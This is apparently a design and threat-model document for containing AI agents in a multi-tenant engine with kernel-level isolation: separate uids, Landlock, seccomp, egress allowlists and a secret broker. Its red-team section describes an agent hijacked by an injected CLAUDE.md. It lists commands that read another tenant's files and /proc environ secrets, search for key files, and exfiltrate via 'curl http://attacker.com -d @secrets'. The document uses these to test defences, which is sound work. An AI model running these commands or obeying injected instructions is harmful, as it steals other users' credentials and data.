# Agent Isolation — Airlock

Multi-tenant containment for the standalone Engine. **The agent is the
adversary.** Move the trust boundary from the prompt to the kernel.

> Status: design + threat model. Implementation tracked in phases (§9).
> Scope: `engine/` running multi-tenant (Always-On / Teams). NOT the
> desktop app (single human, single tenant — out of scope).

---

## 1. Thesis

Prompt guardrails are not a security boundary. A broken or injected
prompt turns a benign agent into a hostile one, and the runtime cannot
tell when that happened. So we stop trying to make the agent *behave*
(prompt layer) and instead make it unable to *misbehave* (kernel layer).

**Containment, not correction.** The trust boundary lives in the OS, not
in the model. Native prompt defenses stop a minority of injection-driven
incidents; the residual risk must be bounded by the kernel, not by the
model's compliance.

The canonical frame is the **lethal trifecta** — an agent is dangerous
only when it combines all three at once:

1. Access to private data (its folder **+** the neighbours')
2. Exposure to untrusted content (the injectable prompt)
3. Ability to exfiltrate (open network, shared disk)

(2) is inherent to an agent and cannot be removed. So we break (1) and
(3) with infrastructure. That is the whole strategy.

---

## 2. Where this bites (deployment reality)

The "shared machine where each agent has its own folder and A can read B"
is **NOT** the Mac/Windows desktop. The desktop is a thin client; all its
agents belong to one human, so cross-agent reads are ugly but not
catastrophic.

The threat is the **standalone Engine** running multi-tenant:

```
Desktop (Mac/Win)                    Always-On  ◄── threat lives here
┌──────────────────────┐            ┌────────────────────────────────┐
│ Tauri app (1 human)  │            │  VPS / Docker / Kubernetes       │
│  └─ engine sidecar   │            │  Linux host, one container       │
│      └─ your agents  │            │   └─ houston-engine (1 process)  │
└──────────────────────┘            │       ├─ agent A  ┐ same uid     │
                                    │       ├─ agent B  ├ same disk    │
  client only — connects            │       └─ agent C  ┘              │
  to the engine over HTTP+WS        │   /data/.houston/workspaces/     │
                                    └────────────────────────────────┘
```

In `teams/` (hosted multi-tenant), **"agent A reads agent B" becomes
"customer A reads customer B"** — game over for selling to an enterprise.

`always-on/Dockerfile` confirms it: *"Typical deployment: VPS or
Kubernetes, behind a reverse proxy with TLS"* — Linux host. This is why
Linux-only primitives (namespaces, Landlock, seccomp) are the correct
choice: they go into the Engine binary, which only runs multi-tenant on
Linux. The desktop needs none of it.

---

## 3. Ground truth — current isolation model

Mapped against the code. Today there is **no boundary between agents**.

| Boundary | Status | Evidence |
|---|---|---|
| OS user | none | all subprocesses run as the same uid as the engine |
| Filesystem (inter-agent) | none | `houston-agent-files` only blocks `../` *within* one agent folder; an agent can `cat ~/.houston/workspaces/B/...` |
| Process / PID | none | A reads `/proc/<B>/environ` → steals B's secrets / API keys |
| cwd jail | none | the CLI can `cd /` anywhere the uid reaches |
| Network egress | none | exfiltration to a C&C is unrestricted |
| Per-agent authz | none | one `HOUSTON_ENGINE_TOKEN` grants access to **every** agent |

### The chokepoint (the key asset)

Every agent subprocess is spawned through **one** call site:

```
engine/houston-terminal-manager/src/cli_process.rs  →  cmd.spawn()
```

One `Command::new(...).spawn()`. All isolation can be injected here,
surgically, via `std::os::unix::process::CommandExt::pre_exec()` — code
that runs in the child after `fork`, before `exec`. No app rewrite.

### What the existing hardening does NOT do

`always-on/houston-engine.service` already sets `NoNewPrivileges`,
`ProtectSystem=full`, `ProtectHome=read-only`, and the Dockerfile wraps
the engine in a container. **That isolates the engine from the host. It
does nothing agent-to-agent** — inside the container all agents are still
one uid sharing one disk. Airlock is the missing layer: a cell around
*each agent*, inside the box that already exists.

---

## 4. Architecture — the Airlock cell

Defense in depth. Each agent runs inside a cell; every layer is applied
*before `exec`*, at the single chokepoint.

```
┌─ Engine (privileged, holds the secrets) ─────────────────────┐
│                                                              │
│   spawn chokepoint  ──►  CELL: agent A                       │
│                          ┌──────────────────────────────┐    │
│                          │ uid       → per-tenant uid    │    │
│                          │ Landlock  → FS read/write jail │    │
│                          │ seccomp   → minimal syscalls   │    │
│                          │ /proc     → owner-only environ │    │
│                          │ egress    → uid-matched allow  │    │
│                          │ cgroups   → CPU/RAM cap         │    │
│                          │ NO secrets in env  ◄── broker   │    │
│                          └──────────────────────────────┘    │
│   (agents B, C... each in an identical cell)                 │
└──────────────────────────────────────────────────────────────┘
```

### Layers and the attack each kills

| Layer | Mechanism (Linux) | Kills |
|---|---|---|
| L1 Identity | `setuid(tenant_uid)` in `pre_exec` + `chown 0700` agent dir | A acts with B's permissions; A signals B |
| L2 Filesystem | Landlock LSM (`landlock` crate); optional mount-ns bind | A reads `workspaces/B/`; cwd escape |
| L3 /proc | falls out of L1 — `environ` is owner-readable only | A reads `/proc/<B>/environ` (secret theft) |
| L4 Syscalls | seccomp-bpf (`seccompiler`): block `ptrace`, `process_vm_readv/writev` | reading another process's memory |
| L5 Network | `iptables -m owner --uid-owner` → egress allowlist | exfiltration to a C&C |
| L6 Secrets | broker: agent never holds the API key (§6) | credential exfiltration |
| L7 Authz | per-agent capability token in the engine (§7) | a client of A spawns a session for B |

### The keystone: per-tenant uid

Assigning each agent/tenant a **distinct uid** makes three defenses fall
out of standard Unix DAC almost for free:

- **L3 for free** — `/proc/<pid>/environ` is readable only by the owning
  uid (or root). Distinct uids → no cross-agent environ theft, no code.
- **L5 clean** — `iptables ... -m owner --uid-owner <uid>` matches egress
  by the agent's uid, so the allowlist is per-tenant by construction.
- **L1/L2 baseline** — file ownership + `0700` already blocks
  cross-agent reads before Landlock even loads.

The engine runs as root *inside the container* (not on the host — the
container is the host boundary) and drops to the per-tenant uid in
`pre_exec`. Landlock + seccomp are the in-process belt-and-suspenders on
top, unprivileged.

---

## 5. Where it plugs into the code

| Concern | File | Change |
|---|---|---|
| Cell setup (L1–L4) | `engine/houston-terminal-manager/src/cli_process.rs` | wrap the spawn in `CommandExt::pre_exec()`: setuid, Landlock ruleset, seccomp filter |
| Tenant → uid map | `engine/houston-terminal-manager/src/` (new module) | deterministic uid allocation per agent path |
| Egress allowlist (L5) | `always-on/Dockerfile` + entrypoint | iptables owner-match rules at container boot |
| Secret broker (L6) | new local proxy + engine wiring | agent talks to a localhost proxy that injects the key |
| Per-agent authz (L7) | `engine/houston-engine-server/src/auth.rs`, `routes/sessions.rs` | capability token scoped to one agent path |

---

## 6. Secret broker

Today the CLI inherits the engine's full env → any agent that reads
`/proc` or `env` sees `ANTHROPIC_API_KEY`. L1 closes `/proc`, but the
durable fix is that **the agent never holds the credential**:

```
agent  ──HTTP localhost──►  broker (privileged)  ──real key──►  provider API
        (scoped token)       injects credential,                / integrations
                             allowlist + rate-limit + audit log
```

The agent holds only a short-lived capability token (its tenant, its
integrations). Enterprise bonus: a single auditable choke — every
outbound call logged, per agent.

---

## 7. Engine authz gap (L7)

OS isolation stops a *process* from reaching another agent's data. It
does **not** stop a *client* from asking the engine, over the API, to act
on another agent. Today one `HOUSTON_ENGINE_TOKEN` grants access to every
agent (`auth.rs`), and `routes/sessions.rs` resolves the `agent_path`
from the request without checking ownership.

Fix: capability tokens scoped to one agent path. A token for agent A
returns 403 on any route targeting agent B. App-layer, independent of the
OS sandbox — both are required (the OS layer and the API layer are
different attack surfaces).

---

## 8. Implementation tiers (why in-process)

| Tier | Isolation | Effort | Notes |
|---|---|---|---|
| **A. In-process: uid + Landlock + seccomp** | strong | medium | injected at the chokepoint, mostly unprivileged. **Chosen.** Best impact/effort; needs kernel ≥5.13 for Landlock |
| B. Container per agent (Podman/runc) | strong | medium-high | more enterprise-familiar but must orchestrate per-agent container lifecycle + mount the CLI inside |
| C. microVM per agent (Firecracker/gVisor) | maximum | high | separate kernel, minimal blast radius; hard to finish in a hackathon window |

Tier A wins because it exploits the single spawn chokepoint, needs no
root on the host, and is written in the same Rust as the engine.

---

## 9. Build phases

Ordered by demo impact and dependency:

1. **Caged agent (core)** — per-tenant uid + Landlock FS jail in
   `pre_exec`. Kills the two flashiest attacks (read neighbour folder +
   `/proc/environ`). The demonstrable heart.
2. **seccomp** — block `ptrace` / `process_vm_readv`. Closes memory theft.
3. **Egress allowlist** — iptables owner-match. Blocks exfiltration.
4. **Per-agent authz** — capability token in the engine. Closes the API
   bypass.
5. **Red-team harness** — a malicious agent running the 5 attacks,
   before/after script, results table.

Minimum presentable = phases 1 + 5. Each phase adds a green row.

---

## 10. Red-team demo (proof)

A malicious agent (injected `CLAUDE.md`) attempts five things, run with
and without Airlock:

| Attack | Today | With Airlock |
|---|---|---|
| `cat ~/.houston/workspaces/VICTIM/.houston/config.json` | reads | `ENOENT` (Landlock / uid) |
| `cat /proc/<pid>/environ` to steal an API key | steals | not owner → `EACCES` (uid) |
| `curl http://attacker.com -d @secrets` | exfiltrates | blocked (egress allowlist) |
| `cd / && find / -name "*.key"` | wanders | jailed (Landlock) |
| ask the engine for another agent's session with the token | accesses | 403 (capability token) |

Headline: from *"native prompt defenses stop a minority of incidents"* to
*"the residual is bounded by the kernel, not the model."*

---

## 11. Dependencies / caveats

- **Kernel ≥5.13** for Landlock (ABI v1); 6.x for richer rules. Engine
  must degrade loudly (refuse to run unsandboxed in multi-tenant mode,
  not silently fall back) per the no-silent-failures policy.
- **CAP_SETUID inside the container** to drop to per-tenant uids. The
  container is the host boundary; engine-as-root *in the container* is
  acceptable, engine-as-root *on the host* is not.
- **seccomp + NoNewPrivileges** compose; the existing systemd unit
  already sets `NoNewPrivileges`.
- Landlock cannot restrict network — that is why L5 is a separate
  iptables/net-ns layer, not part of the FS ruleset.

See `knowledge-base/architecture.md` (engine crates),
`knowledge-base/auth.md` (current token model),
`knowledge-base/engine-server.md` (binary ops).

---

## 12. Implementation status — Phases 1-3 (uid + Landlock + seccomp + egress)

**Done.** In-process layers (L1-L4) live in
`engine/houston-terminal-manager/src/isolation/` (`mod.rs` cross-platform,
`linux.rs` impl, `seccomp.rs` BPF denylist), wired into the single spawn
chokepoint `cli_process::run_cli_process`. The egress layer (L5) is container
config under `always-on/`. All activated by `HOUSTON_ISOLATION` (default OFF →
desktop/dev untouched).

`pre_exec` order: Landlock `restrict_self` → drop privileges → seccomp.

- **L1/L3 (uid):** per-tenant uid = FNV-1a(agent_path) into
  `[100000, 160000)`, deterministic across restarts. Parent provisions
  (`chown 0700` agent dir + tenant home), child drops via
  `setgroups([])` → `setresgid` → `setresuid` in `pre_exec`.
- **L2 (Landlock):** ruleset built in the **parent** (fork-safe: all
  allocation + `landlock_add_rule` before fork), `restrict_self()` applied
  in the child. `CompatLevel::HardRequirement` → loud failure on a
  pre-5.13 kernel, never an un-jailed fallback.
- **L4 (seccomp):** BPF denylist compiled in the **parent**
  (`seccompiler`), applied last in the child. Default-allow; denies
  `ptrace`, `process_vm_readv`, `process_vm_writev`, `kcmp`,
  `pidfd_getfd`, `process_madvise` → `EPERM`. Closes "read another
  process's memory" at the kernel even for same-uid edge cases.
- **L5 (egress):** `always-on/airlock-egress.sh` — iptables `owner` match
  on the tenant uid range (100000-159999, mirrors `mod.rs`). Tenant-owned
  output goes through the `AIRLOCK_EGRESS` chain: loopback + DNS +
  `HOUSTON_EGRESS_ALLOW` CIDRs RETURN (allowed), everything else DROP.
  Non-tenant uids untouched. Installed at container boot by
  `airlock-entrypoint.sh`; v6 denied wholesale. A *domain* allowlist needs
  the broker (Phase 6) — iptables can't track CDN domains safely.

### Enabling it (Always-On)

```
docker compose -f docker-compose.yml -f docker-compose.airlock.yml up -d
```

The override runs the engine as root-in-container with `NET_ADMIN`,
`SETUID`, `SETGID`, `CHOWN`, sets `HOUSTON_ISOLATION=1`, and installs the
egress policy before exec. Set `HOUSTON_EGRESS_ALLOW` to the provider API
CIDRs (else agents reach only loopback + DNS).

### Allowed filesystem paths (the jail)

| Access | Paths | Why |
|---|---|---|
| read-write | agent folder, per-tenant `$HOME` | the agent's own data + CLI transcripts |
| read-write | `$HOME/tmp` (via `TMPDIR`) | private scratch — **no global `/tmp`** (it would be a cross-tenant leak channel) |
| read-only | `/usr /bin /sbin /lib /lib64 /etc /opt /run /proc` | CLI binary, node, shared libs, TLS roots, DNS |
| read-only | `/dev/urandom /dev/random /dev/zero /dev/tty` | entropy / tty |
| read-write | `/dev/null` | discard sink |

The read-only list is the **integration-risk surface**: it's deliberately
broad for the MVP and tightened in Phase 1.3 against a real `claude -p`
run inside the always-on container.

### Verified

- `cargo test -p houston-terminal-manager` — 225 pass, full suite green.
- **Red-team proof, L2 (unprivileged, this kernel):**
  `isolation::linux::tests::landlock_jail_blocks_sibling_read_but_allows_own`
  spawns a child jailed to an "attacker" folder; reading the "victim"
  tenant's `secret.txt` fails (`EACCES`), reading its own file succeeds —
  the "agent A cannot read agent B" property enforced by the kernel.
- **Red-team proof, L4 (unprivileged, this kernel):**
  `isolation::seccomp::tests::seccomp_blocks_ptrace` installs the filter in
  a child and confirms `ptrace(PTRACE_TRACEME)` is rejected with `EPERM`.
- **Red-team proof, L5 (live, real iptables in a throwaway container):**
  `always-on/airlock-egress.sh selftest` — a tenant-uid `curl` to an
  external IP is BLOCKED by default, ALLOWED once the IP is on the
  allowlist, and root egress is UNAFFECTED. Runs in the container's own
  netns, so the host firewall is untouched.
- The uid-drop layers (L1/L3) need root; their integration test is
  `#[ignore]` and the real-agent gate runs in the container.

### Not yet (later phases)

per-agent authz (4), the full malicious-agent harness (5), and running a
**real** `claude` session under the complete jail (uid + Landlock + seccomp
+ egress) as root in the always-on container (Phase 1.3 gate).
